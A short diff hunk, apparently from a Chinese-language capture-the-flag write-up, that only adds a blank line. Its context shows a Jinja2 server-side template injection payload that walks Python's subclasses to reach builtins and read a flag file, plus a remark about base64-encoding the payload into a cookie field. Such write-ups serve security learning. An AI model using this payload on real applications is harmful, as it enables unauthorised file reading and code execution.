@@ -226,6 +226,7 @@ poc 需要base64编码填入在cookie的username字段,还因为是python3 一�
 
 读flag:
 
+
 ```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('\\flag', 'r').read() }}{% endif %}{% endfor %}
 ```
